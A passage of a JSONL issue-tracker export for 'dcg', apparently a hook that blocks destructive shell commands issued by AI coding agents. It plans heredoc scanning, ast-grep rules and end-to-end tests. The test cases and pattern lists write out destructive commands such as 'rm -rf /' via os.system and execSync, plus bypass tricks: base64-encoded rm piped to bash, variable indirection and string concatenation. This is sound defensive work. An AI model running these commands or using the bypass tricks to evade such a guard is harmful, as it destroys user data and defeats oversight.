legitimate uses:\n- Documentation containing command examples\n- Grep patterns searching for dangerous commands\n- Test files containing example commands\n- Config files with commented dangerous commands\n- bd create with descriptions about dangerous patterns\n\n### 5. Performance Tests\n\n- Latency benchmarks for various command types\n- Memory usage under load\n- Concurrent command checking\n- Large heredoc handling\n\n## Test Infrastructure\n\n### Test Data Directory\n```\ntests/\n  fixtures/\n    heredocs/\n      bash/\n      python/\n      javascript/\n      ruby/\n      perl/\n    bypass_attempts/\n    false_positives/\n```\n\n### Test Macros\n```rust\n// Test that a command is blocked\nassert_blocked!(\"python3 \u003c\u003c 'EOF'\\nimport os; os.system('rm -rf /')\\nEOF\");\n\n// Test that a command is allowed\nassert_allowed!(\"python3 \u003c\u003c 'EOF'\\nprint('hello')\\nEOF\");\n\n// Test specific pattern match\nassert_pattern_matches!(\"python\", \"os.system($CMD)\", \"os.system('rm -rf /')\");\n```\n\n## Success Criteria\n\n- 100% coverage of documented attack vectors\n- Zero false positives in false_positive test suite\n- All performance tests pass within budget\n- Clear documentation of what each test validates\n\n## Dependencies\n\n- Integration pipeline must be complete\n- All language patterns must be defined\n- Performance benchmarking infrastructure\n","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T18:40:09.282575411-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:40:16.193121871-05:00","dependencies":[{"issue_id":"git_safety_guard-8wt","depends_on_id":"git_safety_guard-e7m","type":"blocks","created_at":"2026-01-07T18:40:16.212012296-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-b45","title":"Research ast-grep API and integration patterns","description":"# Research ast-grep API and Integration Patterns\n\n## Objective\nThoroughly understand ast-grep's capabilities, API, and integration options to make informed architecture decisions.\n\n## Background\nast-grep (https://ast-grep.github.io/) is a CLI tool and library for structural code search. It uses tree-sitter for parsing and provides a pattern matching language for AST nodes. We need to understand how to leverage it for detecting destructive patterns in heredoc content.\n\n## Research Areas\n\n### 1. CLI Interface\n- Command syntax for pattern matching\n- JSON output format (--json flag)\n- Language specification options\n- Performance characteristics (startup time, parsing speed)\n- Error handling and edge cases\n\n### 2. Pattern Language\n- Basic pattern syntax ($VAR for metavariables)\n- Pattern composition and nesting\n- Regex support within patterns\n- Multiple pattern matching\n- YAML rule files vs inline patterns\n\n### 3. Language Support\n- Which languages are supported out of the box?\n- How are languages detected/specified?\n- Can we add custom language support?\n- Tree-sitter grammar availability\n\n### 4. Library Integration (sg crate)\n- Is there a Rust library we can use directly?\n- API surface and documentation\n- Dependency graph and compile time impact\n- Memory usage patterns\n\n### 5. Performance Benchmarks\n- Time to parse small code snippets (10-100 lines)\n- Pattern matching overhead\n- Comparison: CLI invocation vs library calls\n- Caching possibilities\n\n## Deliverables\n- Document summarizing findings\n- Code snippets demonstrating CLI and library usage\n- Performance benchmark results\n- Recommendation for integration approach\n\n## Success Criteria\n- Can confidently choose between CLI and library integration\n- Understand pattern language well enough to write destructive patterns\n- Have baseline performance numbers for decision making\n\n## Resources\n- https://ast-grep.github.io/\n- https://github.com/ast-grep/ast-grep\n- https://tree-sitter.github.io/tree-sitter/","notes":"Research completed: ast-grep-core v0.40.4 available on crates.io. Provides Pattern struct and Matcher trait. Depends on tree-sitter ^0.26.3. Intuitive pattern syntax like 'os.system($CMD)'. Recommended approach for dcg.","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T18:28:24.602476336-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:46:12.030060139-05:00"}
{"id":"git_safety_guard-beq","title":"Define Python destructive patterns for heredoc scanning","description":"# Define Python Destructive Patterns for Heredoc Scanning\n\n## Objective\nCreate ast-grep/tree-sitter patterns to detect destructive operations in Python heredoc content.\n\n## Background\nPython offers many ways to perform destructive operations. We need comprehensive patterns that catch common attack vectors while minimizing false positives.\n\n## Patterns to Implement\n\n### 1. File System Operations\n\n**Direct file deletion:**\n- os.remove(path)\n- os.unlink(path)\n- pathlib.Path(path).unlink()\n- shutil.rmtree(path)\n- shutil.move() when destination exists\n\n**ast-grep pattern examples:**\n```yaml\nid: python-os-remove\nlanguage: python\nrule:\n  pattern: os.remove($PATH)\n  message: \"os.remove() deletes files - verify path is safe\"\n\nid: python-shutil-rmtree  \nlanguage: python\nrule:\n  pattern: shutil.rmtree($PATH)\n  message: \"shutil.rmtree() recursively deletes directories\"\n```\n\n### 2. Command Execution\n\n**Shell commands:**\n- os.system(cmd)\n- os.popen(cmd)\n- subprocess.run(cmd, shell=True)\n- subprocess.call(cmd, shell=True)\n- subprocess.Popen(cmd, shell=True)\n\n**ast-grep patterns:**\n```yaml\nid: python-os-system\nlanguage: python\nrule:\n  pattern: os.system($CMD)\n  message: \"os.system() executes shell commands\"\n\nid: python-subprocess-shell\nlanguage: python\nrule:\n  any:\n    - pattern: subprocess.run($$$, shell=True, $$$)\n    - pattern: subprocess.call($$$, shell=True, $$$)\n    - pattern: subprocess.Popen($$$, shell=True, $$$)\n  message: \"subprocess with shell=True executes arbitrary commands\"\n```\n\n### 3. Code Execution\n\n**Dynamic execution:**\n- exec(code)\n- eval(code)\n- compile() + exec()\n\n### 4. Database Operations\n\n**Destructive SQL:**\n- cursor.execute(\"DROP ...\")\n- cursor.execute(\"TRUNCATE ...\")\n- cursor.execute(\"DELETE FROM ... WHERE 1=1\")\n\nNote: These require checking string content, which is harder.\n\n### 5. Network/Download and Execute\n\n**Dangerous patterns:**\n- urllib.request.urlopen() + exec()\n- requests.get() + exec()\n\n## Pattern File Location\n- src/heredoc/patterns/python.yml\n- Or embedded in Rust code\n\n## Severity Levels\n- Critical: os.system, subprocess with shell, exec/eval\n- High: shutil.rmtree, os.remove\n- Medium: subprocess without shell (less dangerous)\n\n## False Positive Mitigation\n- Don't flag imports alone (import os is fine)\n- Consider context (test files, documentation)\n- Allow configuration to disable specific patterns\n\n## Testing\n- Test each pattern matches its target\n- Test patterns don't match safe code\n- Test edge cases (different import styles, aliases)\n\n## Dependencies\n- Design: pattern library structure (git_safety_guard-6sg)\n- ast-grep invocation (git_safety_guard-f4f)\n\n## Success Criteria\n- Cover top 10 dangerous Python patterns\n- Reasonable false positive rate (\u003c5%)\n- Patterns validated against real-world code","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T18:32:51.428196157-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:32:51.428196157-05:00","dependencies":[{"issue_id":"git_safety_guard-beq","depends_on_id":"git_safety_guard-6sg","type":"blocks","created_at":"2026-01-07T18:34:20.583247557-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-beq","depends_on_id":"git_safety_guard-f4f","type":"blocks","created_at":"2026-01-07T18:34:20.601617242-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-boy","title":"Evaluate embedded Rust crates vs external binaries for AST analysis","description":"## Objective\n\nEmbed structural analysis directly in the dcg binary using Rust crates rather than shelling out to external tools.\n\n## Architecture Decision\n\n**DECISION: Embed tree-sitter and ast-grep-core in Rust binary**\n\n### Why Not External Binaries?\n\nExternal process invocation (ripgrep CLI, ast-grep CLI) has unacceptable overhead:\n- Process spawn: 5-20ms\n- IPC serialization: 1-5ms\n- Output parsing: 1-2ms\n- Total: 10-50ms per command\n\nSince dcg runs on EVERY bash command, this latency is unacceptable. Users would notice slowdown.\n\n### Why Embedded Rust Crates?\n\n1. **tree-sitter** is available as a Rust crate with excellent performance\n2. **ast-grep is written in Rust** - we may be able to use ast-grep-core directly\n3. **Language grammars** are available as Rust crates (tree-sitter-bash, etc.)\n4. **Sub-millisecond latency** when everything is compiled in\n5. **Single binary** - no \"install ast-grep\" requirement\n\n### Implementation Strategy\n\n#### Phase 1: tree-sitter Integration\n```toml\n[dependencies]\ntree-sitter = \"0.22\"\ntree-sitter-bash = \"0.21\"\ntree-sitter-python = \"0.21\"\ntree-sitter-javascript = \"0.21\"\n# ... etc\n```\n\n#### Phase 2: Pattern Matching\n\nTwo options:\n\n**Option A: tree-sitter Queries**\nUse tree-sitter's built-in query language (S-expressions):\n```scheme\n(command\n  name: (command_name) @cmd\n  argument: (word) @arg\n  (#eq? @cmd \"rm\")\n  (#match? @arg \"-rf\"))\n```\n\nPros: Built into tree-sitter, well-documented\nCons: Verbose, less expressive than ast-grep patterns\n\n**Option B: ast-grep-core Crate**\nIf ast-grep publishes a library crate, use it:\n```rust\nuse ast_grep_core::{Pattern, Matcher};\n\nlet pattern = Pattern::new(\"os.system($CMD)\")?;\nlet matches = pattern.find_all(\u0026python_ast);\n```\n\nPros: More expressive patterns, proven matching logic\nCons: May not be published as separate crate, may need vendoring\n\n**Option C: Vendor ast-grep Code**\nIf ast-grep-core isn't available as a crate:\n1. Clone ast-grep repo\n2. Extract relevant modules (pattern matching, not CLI)\n3. Vendor into our codebase\n4. Maintain minimal fork\n\nPros: Full control\nCons: Maintenance burden\n\n#### Recommendation: Try in order A → B → C\n\n1. Start with tree-sitter queries - simplest, no extra deps\n2. If queries are too limiting, try ast-grep-core crate\n3. If not available, vendor minimal ast-grep code\n\n### Performance Budget\n\nTarget latency for heredoc analysis:\n- Heredoc detection (regex): \u003c0.5ms\n- Content extraction: \u003c0.1ms\n- tree-sitter parse: \u003c2ms (for typical heredoc size)\n- Pattern matching: \u003c1ms\n- **Total: \u003c5ms worst case**\n\n### Binary Size Considerations\n\nEach tree-sitter grammar adds ~500KB-2MB to binary size.\n6 languages × 1MB average = ~6MB added\n\nMitigation:\n- Compile grammars with size optimization\n- Consider optional features (--features python,bash,js)\n- Default: most common languages (bash, python, js)\n- Extended: all languages\n\n### Research Tasks Update\n\nThis decision affects:\n- git_safety_guard-b45: Research should focus on ast-grep's Rust internals\n- git_safety_guard-2j3: This becomes primary focus - tree-sitter Rust bindings\n- git_safety_guard-5ib: ADR should document this embedded approach\n\n## Success Criteria\n\n- All parsing embedded in single binary\n- No external tool dependencies\n- Heredoc analysis completes in \u003c5ms\n- Binary size increase \u003c10MB\n- Pattern matching expressiveness sufficient for all use cases\n","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T18:39:01.437304904-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:39:09.138923635-05:00","dependencies":[{"issue_id":"git_safety_guard-boy","depends_on_id":"git_safety_guard-b45","type":"blocks","created_at":"2026-01-07T18:39:09.157751983-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-boy","depends_on_id":"git_safety_guard-2j3","type":"blocks","created_at":"2026-01-07T18:39:09.175608651-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-du4","title":"Implement language detection from command context","description":"# Implement Language Detection from Command Context\n\n## Objective\nImplement the language detection logic that determines which parser/patterns to use for heredoc content.\n\n## Background\nBased on the design (git_safety_guard-jfj), implement the multi-source language detection:\n1. Command prefix lookup\n2. Shebang detection\n3. Content heuristics (fallback)\n\n## Implementation Details\n\n### Language Enum\n\n```rust\n#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]\npub enum Language {\n    Python,\n    Bash,\n    JavaScript,\n    TypeScript,\n    Ruby,\n    Perl,\n    Php,\n    Unknown,\n}\n\nimpl Language {\n    /// Get the tree-sitter/ast-grep language identifier\n    pub fn grammar_name(\u0026self) -\u003e Option\u003c\u0026'static str\u003e {\n        match self {\n            Self::Python =\u003e Some(\"python\"),\n            Self::Bash =\u003e Some(\"bash\"),\n            Self::JavaScript =\u003e Some(\"javascript\"),\n            Self::TypeScript =\u003e Some(\"typescript\"),\n            Self::Ruby =\u003e Some(\"ruby\"),\n            Self::Perl =\u003e Some(\"perl\"),\n            Self::Php =\u003e Some(\"php\"),\n            Self::Unknown =\u003e None,\n        }\n    }\n}\n```\n\n### Command Prefix Mapping\n\n```rust\nstatic COMMAND_LANGUAGE_MAP: LazyLock\u003cHashMap\u003c\u0026'static str, Language\u003e\u003e = LazyLock::new(|| {\n    let mut m = HashMap::new();\n    // Python\n    m.insert(\"python\", Language::Python);\n    m.insert(\"python3\", Language::Python);\n    m.insert(\"python2\", Language::Python);\n    // Bash/Shell\n    m.insert(\"bash\", Language::Bash);\n    m.insert(\"sh\", Language::Bash);\n    m.insert(\"zsh\", Language::Bash);\n    m.insert(\"ksh\", Language::Bash);\n    // JavaScript/Node\n    m.insert(\"node\", Language::JavaScript);\n    m.insert(\"nodejs\", Language::JavaScript);\n    // ... etc\n    m\n});\n\npub fn detect_from_command(cmd: \u0026str) -\u003e Option\u003cLanguage\u003e {\n    // Extract first word (command name)\n    let first_word = cmd.split_whitespace().next()?;\n    // Handle paths: /usr/bin/python3 -\u003e python3\n    let basename = first_word.rsplit('/').next()?;\n    COMMAND_LANGUAGE_MAP.get(basename).copied()\n}\n```\n\n### Shebang Detection\n\n```rust\npub fn detect_from_shebang(content: \u0026str) -\u003e Option\u003cLanguage\u003e {\n    let first_line = content.lines().next()?;\n    if !first_line.starts_with(\"#!\") {\n        return None;\n    }\n    // Parse: #!/usr/bin/env python3 -\u003e python3\n    // Parse: #!/bin/bash -\u003e bash\n    let interpreter = first_line\n        .strip_prefix(\"#!\")?\n        .trim()\n        .split_whitespace()\n        .last()?\n        .rsplit('/')\n        .next()?;\n    COMMAND_LANGUAGE_MAP.get(interpreter).copied()\n}\n```\n\n### Content Heuristics (Fallback)\n\n```rust\npub fn detect_from_content(content: \u0026str) -\u003e Option\u003cLanguage\u003e {\n    // Very basic heuristics - only if nothing else works\n    let lines: Vec\u003c\u0026str\u003e = content.lines().take(10).collect();\n    \n    // Python indicators\n    if lines.iter().any(|l| l.starts_with(\"import \") || l.starts_with(\"from \")) {\n        return Some(Language::Python);\n    }\n    \n    // JavaScript/Node indicators\n    if lines.iter().any(|l| l.contains(\"require(\") || l.contains(\"const \") || l.contains(\"let \")) {\n        return Some(Language::JavaScript);\n    }\n    \n    // Ruby indicators\n    if lines.iter().any(|l| l.starts_with(\"def \") \u0026\u0026 content.contains(\"end\")) {\n        return Some(Language::Ruby);\n    }\n    \n    None\n}\n```\n\n### Combined Detection\n\n```rust\npub fn detect_language(cmd: \u0026str, heredoc: \u0026HeredocContent) -\u003e Language {\n    // Priority 1: Command prefix\n    if let Some(lang) = detect_from_command(cmd) {\n        return lang;\n    }\n    \n    // Priority 2: Shebang\n    if let Some(lang) = detect_from_shebang(\u0026heredoc.content) {\n        return lang;\n    }\n    \n    // Priority 3: Content heuristics\n    if let Some(lang) = detect_from_content(\u0026heredoc.content) {\n        return lang;\n    }\n    \n    Language::Unknown\n}\n```\n\n## Files to Modify\n- New: src/heredoc/language.rs\n- src/heredoc/mod.rs\n\n## Testing\n- Test command prefix for all supported commands\n- Test shebang detection with various formats\n- Test content heuristics\n- Test fallback chain\n\n## Dependencies\n- Design: language detection heuristics (git_safety_guard-jfj)\n- Implement heredoc extraction (git_safety_guard-y4j)\n\n## Success Criteria\n- Correctly identify language in 95%+ of test cases\n- No panics on malformed input\n- Clear Language::Unknown for genuinely unknown cases","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T18:31:49.058497233-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:31:49.058497233-05:00","dependencies":[{"issue_id":"git_safety_guard-du4","depends_on_id":"git_safety_guard-y4j","type":"blocks","created_at":"2026-01-07T18:31:58.308674617-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-du4","depends_on_id":"git_safety_guard-jfj","type":"blocks","created_at":"2026-01-07T18:31:58.326331058-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-e2eh","title":"Extend e2e_test.sh with heredoc test cases","description":"# E2E Test Script Extension for Heredocs\n\n## Objective\n\nExtend the existing `scripts/e2e_test.sh` with comprehensive heredoc test cases.\n\n## Test Categories to Add\n\n### 1. Heredoc Detection Tests\n\n```bash\n# Should BLOCK - Python heredoc with os.system\ntest_blocked 'python3 \u003c\u003c EOF\nimport os\nos.system(\"rm -rf /tmp/test\")\nEOF' \"Python heredoc with os.system\"\n\n# Should BLOCK - Bash heredoc with rm\ntest_blocked 'bash \u003c\u003c EOF\nrm -rf /important\nEOF' \"Bash heredoc with rm -rf\"\n\n# Should BLOCK - Node inline script\ntest_blocked 'node -e \"require('child_process').execSync('rm -rf /')\"' \"Node inline with execSync\"\n```\n\n### 2. Heredoc Variant Tests\n\n```bash\n# Test all heredoc syntaxes\ntest_blocked 'cat \u003c\u003cEOF | python3\nimport os; os.system(\"rm -rf /\")\nEOF' \"Piped heredoc\"\n\ntest_blocked 'python3 \u003c\u003c-EOF\n    import os\n    os.system(\"rm -rf /\")\nEOF' \"Indented heredoc (\u003c\u003c-)\"\n\ntest_blocked 'python3 \u003c\u003c'EOF'\nimport os\nos.system(\"rm -rf /\")\nEOF' \"Quoted delimiter heredoc\"\n```\n\n### 3. Language Coverage Tests\n\n```bash\n# Python\ntest_blocked 'python3 -c \"import shutil; shutil.rmtree('/tmp')\"'\n\n# Ruby  \ntest_blocked 'ruby -e \"FileUtils.rm_rf('/tmp')\"'\n\n# Perl\ntest_blocked 'perl -e \"system('rm -rf /')\"'\n\n# JavaScript\ntest_blocked 'node -e \"require('fs').rmdirSync('/', {recursive:true})\"'\n```\n\n### 4. False Positive Tests\n\n```bash\n# Should ALLOW - Documentation with dangerous strings\ntest_allowed 'bd create --description=\"This pattern blocks rm -rf\"' \"Doc with rm -rf\"\ntest_allowed 'git commit -m \"Fix git reset --hard detection\"' \"Commit msg\"\ntest_allowed 'grep \"rm -rf\" src/main.rs' \"Grep for pattern\"\ntest_allowed 'echo \"example: git push --force\"' \"Echo example\"\n```\n\n### 5. Bypass Attempt Tests\n\n```bash\n# Variable indirection\ntest_blocked 'bash -c \"CMD=rm; \\$CMD -rf /\"' \"Variable indirection\"\n\n# Base64 encoding\ntest_blocked 'bash -c \"echo cm0gLXJmIC8K | base64 -d | bash\"' \"Base64 bypass\"\n\n# String concatenation  \ntest_blocked 'python3 -c \"exec('r'+'m'+' -rf /')\"' \"String concat\"\n```\n\n### 6. Edge Cases\n\n```bash\n# Empty heredoc\ntest_allowed 'cat \u003c\u003c EOF\nEOF' \"Empty heredoc\"\n\n# Safe heredoc content\ntest_allowed 'python3 \u003c\u003c EOF\nprint(\"hello world\")\nEOF' \"Safe Python heredoc\"\n\n# Nested quotes\ntest_blocked 'bash -c \"bash -c 'rm -rf /'\"' \"Nested shells\"\n```\n\n## Logging Enhancement\n\nAdd verbose mode:\n```bash\n#!/bin/bash\nset -euo pipefail\n\nVERBOSE=${VERBOSE:-0}\nLOG_FILE=\"e2e_test_$(date +%Y%m%d_%H%M%S).log\"\n\nlog() {\n    echo \"[$(date '+%H:%M:%S')] $*\" | tee -a \"$LOG_FILE\"\n}\n\ntest_blocked() {\n    local cmd=\"$1\"\n    local desc=\"$2\"\n    log \"TEST: $desc\"\n    log \"  CMD: ${cmd:0:80}...\"\n    \n    if echo \"{\\\"tool_name\\\":\\\"Bash\\\",\\\"tool_input\\\":{\\\"command\\\":\\\"$cmd\\\"}}\" | ./target/release/dcg 2\u003e/dev/null; then\n        log \"  FAIL: Expected block, got allow\"\n        return 1\n    else\n        log \"  PASS: Correctly blocked\"\n        return 0\n    fi\n}\n```\n\n## Output Summary\n\nAt end of test run:\n```\n=====================================\nE2E Test Summary\n=====================================\nTotal tests: 150\nPassed: 148\nFailed: 2\nSkipped: 0\n\nFailed tests:\n  - Python heredoc with subprocess (line 234)\n  - Node inline with dynamic require (line 456)\n\nLog file: e2e_test_20260107_193045.log\n=====================================\n```","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T20:00:00-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:00:00-05:00","dependencies":[{"issue_id":"git_safety_guard-e2eh","depends_on_id":"git_safety_guard-e7m","type":"blocks","created_at":"2026-01-07T19:28:32.841249285-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-e7m","title":"Integrate heredoc detection into main check pipeline","description":"## Objective\n\nIntegrate all heredoc detection components into the main dcg check pipeline, creating a seamless flow from command input to block/allow decision.\n\n## Pipeline Architecture\n\n```\nJSON Input → Parse → Quick Reject → Normalize →\n  → Heredoc Detection → [if heredoc found] →\n    → Extract Content → Detect Language → Parse with ast-grep →\n    → Apply Language Patterns → Block Decision\n  → [no heredoc] → Existing Pattern Matching → Block Decision\n```\n\n## Integration Points\n\n### 1. Entry Point Hook\n\nModify main.rs check flow to:\n1. After quick reject passes, check for heredoc indicators\n2. If heredoc found, branch to heredoc analysis path\n3. If no heredoc, continue with existing pattern matching\n4. Merge results from both paths\n\n### 2. Heredoc Detection Integration\n\nInsert heredoc detection before main pattern matching:\n```rust\nfn check_command(cmd: \u0026str) -\u003e CheckResult {\n    // Quick reject (existing)\n    if global_quick_reject(cmd) {\n        return CheckResult::allowed();\n    }\n\n    // NEW: Heredoc detection\n    if let Some(heredoc_result) = check_heredoc(cmd) {\n        if heredoc_result.blocked {\n            return heredoc_result;\n        }\n    }\n\n    // Existing pattern matching\n    REGISTRY.check_command(cmd, \u0026enabled_packs)\n}\n```\n\n### 3. Performance Budget\n\nTotal additional latency budget: 50ms worst case\n- Heredoc detection regex: \u003c2ms\n- Content extraction: \u003c1ms\n- Language detection: \u003c1ms\n- ast-grep invocation: \u003c40ms (external process)\n- Pattern matching: \u003c5ms\n\nIf ast-grep is too slow, fall back to regex patterns for the heredoc body.\n\n### 4. Feature Flag\n\nAdd heredoc scanning to pack system:\n- New pack: \"heredoc\" or integrate into \"core\"\n- Can be enabled/disabled via configuration\n- Default: enabled for new installations\n\n### 5. Error Handling\n\nGraceful degradation:\n- ast-grep not installed → warn, fall back to regex\n- ast-grep timeout → allow command, log warning\n- Parse error → allow command, log for debugging\n- Unknown language → use generic patterns or allow\n\n## Configuration\n\nNew config options:\n```toml\n[heredoc]\nenabled = true\ntimeout_ms = 50\nfallback_on_error = true\nlanguages = [\"python\", \"bash\", \"javascript\", \"typescript\", \"ruby\", \"perl\"]\n```\n\n## Testing Integration\n\nIntegration tests should cover:\n- Normal commands (no heredoc) still work fast\n- Heredoc commands get analyzed\n- Pattern matches in heredocs block correctly\n- Safe heredocs pass through\n- Error paths handle gracefully\n\n## Dependencies\n\n- Heredoc syntax detection\n- Content extraction\n- Language detection\n- ast-grep invocation layer\n- All language patterns\n","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T18:38:07.195631302-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:39:16.10840837-05:00","dependencies":[{"issue_id":"git_safety_guard-e7m","depends_on_id":"git_safety_guard-49s","type":"blocks","created_at":"2026-01-07T18:39:24.471336629-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-e7m","depends_on_id":"git_safety_guard-y4j","type":"blocks","created_at":"2026-01-07T18:39:24.491188224-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-e7m","depends_on_id":"git_safety_guard-du4","type":"blocks","created_at":"2026-01-07T18:39:24.509697502-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-e7m","depends_on_id":"git_safety_guard-f4f","type":"blocks","created_at":"2026-01-07T18:39:24.528749381-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-e7m","depends_on_id":"git_safety_guard-2cu","type":"blocks","created_at":"2026-01-07T18:39:31.682050985-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-e7m","depends_on_id":"git_safety_guard-beq","type":"blocks","created_at":"2026-01-07T18:39:31.702476952-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-e7m","depends_on_id":"git_safety_guard-uau","type":"blocks","created_at":"2026-01-07T18:39:31.720255513-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-e7m","depends_on_id":"git_safety_guard-mcf","type":"blocks","created_at":"2026-01-07T18:39:31.739706774-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-e7m","depends_on_id":"git_safety_guard-26f","type":"blocks","created_at":"2026-01-07T18:39:31.75902245-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-e7m","depends_on_id":"git_safety_guard-mvh","type":"blocks","created_at":"2026-01-07T18:39:31.776348198-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-e7m","depends_on_id":"git_safety_guard-2d4","type":"blocks","created_at":"2026-01-07T18:39:31.795580477-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-erux","title":"Design user-friendly error messages for heredoc blocks","description":"# User-Friendly Error Messages for Heredoc Blocking\n\n## Objective\n\nWhen a heredoc command is blocked, provide clear, actionable error messages that help users understand WHY it was blocked and HOW to proceed.\n\n## Current Error Format (for reference)\n\n```\n╔══════════════════════════════════════════════════════════════╗\n║  ⚠️  BLOCKED: Destructive Command Detected                   ║\n╠══════════════════════════════════════════════════════════════╣\n║  Command: git reset --hard HEAD~5                            ║\n║  Reason:  Hard reset can permanently lose commits            ║\n║  Pack:    core.git                                           ║\n╚══════════════════════════════════════════════════════════════╝\n```\n\n## Enhanced Error Format for Heredocs\n\n```\n╔══════════════════════════════════════════════════════════════╗\n║  ⚠️  BLOCKED: Destructive Pattern in Heredoc                 ║\n╠══════════════════════════════════════════════════════════════╣\n║  Language: Python                                            ║\n║  Pattern:  os.system($CMD)                                   ║\n║  Matched:  os.system(\"rm -rf /tmp/data\")                    ║\n║  Line:     3 of heredoc                                      ║\n║  Reason:   Shell command execution via os.system             ║\n║  Pack:     heredoc.python                                    ║\n╠══════════════════════════════════════════════════════════════╣\n║  Context:                                                    ║\n║    1│ import os                                              ║\n║    2│ path = \"/tmp/data\"                                    ║\n║  ▶ 3│ os.system(\"rm -rf /tmp/data\")  ← BLOCKED             ║\n║    4│ print(\"done\")                                         ║\n╠══════════════════════════════════════════════════════════════╣\n║  💡 Suggestions:                                             ║\n║  • Use pathlib.Path.unlink() for single file deletion       ║\n║  • Use shutil.rmtree() with explicit path validation        ║\n║  • If intentional, use dcg allow --reason \"...\"             ║\n╚══════════════════════════════════════════════════════════════╝\n```\n\n## Error Message Components\n\n### 1. Header\n- Clear indication this is a BLOCK, not just a warning\n- Specify it's a heredoc/inline script detection\n\n### 2. Detection Details\n- Language detected\n- Pattern name that matched\n- Actual matched text (truncated if long)\n- Line number within heredoc\n- Human-readable reason\n\n### 3. Context Window\n- Show 2-3 lines before and after the match\n- Highlight the offending line with arrow\n- Syntax highlighting if terminal supports it\n\n### 4. Suggestions\n- Language-specific safe alternatives\n- How to override if intentional\n- Link to documentation\n\n## JSON Output Format\n\nFor Claude Code hook protocol:\n\n```json\n{\n  \"hookSpecificOutput\": {\n    \"permissionDecision\": \"deny\",\n    \"reason\": \"Heredoc contains destructive pattern: os.system with shell command\",\n    \"details\": {\n      \"detection_type\": \"heredoc\",\n      \"language\": \"python\",\n      \"pattern\": \"os.system($CMD)\",\n      \"matched_text\": \"os.system(\\\"rm -rf /tmp/data\\\")\",\n      \"line_in_heredoc\": 3,\n      \"pack\": \"heredoc.python\",\n      \"suggestions\": [\n        \"Use pathlib.Path.unlink() for single file deletion\",\n        \"Use shutil.rmtree() with explicit path validation\"\n      ]\n    }\n  }\n}\n```\n\n## Suggestions Database\n\nMaintain per-pattern suggestions:\n\n```rust\nstatic PATTERN_SUGGESTIONS: \u0026[(\u0026str, \u0026[\u0026str])] = \u0026[\n    (\"os.system\", \u0026[\n        \"Use subprocess.run() with shell=False\",\n        \"Use pathlib for file operations\",\n    ]),\n    (\"shutil.rmtree\", \u0026[\n        \"Validate path is within expected directory\",\n        \"Use explicit allowlist of deletable paths\",\n    ]),\n    (\"exec\", \u0026[\n        \"Use importlib for dynamic imports\",\n        \"Consider ast.literal_eval for safe evaluation\",\n    ]),\n];\n```\n\n## Test Cases\n\n- Verify all pattern types have suggestions\n- Verify context window is correctly extracted\n- Verify line numbers are accurate\n- Verify JSON output is valid\n- Verify color output is readable\n- Verify truncation for long matches","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T20:45:00-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:45:00-05:00","dependencies":[{"issue_id":"git_safety_guard-erux","depends_on_id":"git_safety_guard-e7m","type":"blocks","created_at":"2026-01-07T19:30:59.175383831-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-f4f","title":"Implement ast-grep-core pattern matching layer","description":"# ast-grep-core Pattern Matching Layer\n\n## Objective\n\nIntegrate ast-grep-core as a Rust library for structural pattern matching in heredoc content.\n\n## Architecture Decision\n\n**EMBED ast-grep-core directly** - NOT shell out to CLI\n\nRationale:\n- Sub-millisecond latency (no process spawn)\n- Single binary distribution (no external dependencies)\n- Better error handling\n- Type-safe Rust API\n\n## Dependencies to Add\n\n```toml\n[dependencies]\nast-grep-core = \"0.40\"\nast-grep-language = { version = \"0.37\", features = [\n    \"bash\",\n    \"python\", \n    \"javascript\",\n    \"typescript\",\n    \"ruby\"\n    # Note: Perl may not be available\n] }\n```\n\n## API Design\n\n```rust\n/// Pattern matcher using ast-grep-core\npub struct AstMatcher {\n    patterns: HashMap\u003cLanguage, Vec\u003cCompiledPattern\u003e\u003e,\n}\n\nimpl AstMatcher {\n    /// Create matcher with default destructive patterns\n    pub fn new() -\u003e Self;\n    \n    /// Load patterns from config\n    pub fn from_config(config: \u0026PatternConfig) -\u003e Result\u003cSelf\u003e;\n    \n    /// Match patterns against code\n    pub fn find_matches(\n        \u0026self,\n        code: \u0026str,\n        language: Language,\n    ) -\u003e Vec\u003cPatternMatch\u003e;\n}\n\n/// Result of pattern matching\npub struct PatternMatch {\n    pub pattern_name: String,\n    pub reason: String,\n    pub matched_text: String,\n    pub line_number: usize,\n    pub severity: Severity,\n}\n\npub enum Severity {\n    Block,      // Always block\n    Warn,       // Log warning but allow\n    Info,       // Informational only\n}\n```\n\n## Pattern Definition Format\n\nPatterns use ast-grep's intuitive syntax:\n\n```rust\nstatic PYTHON_PATTERNS: \u0026[(\u0026str, \u0026str, \u0026str)] = \u0026[\n    // (name, pattern, reason)\n    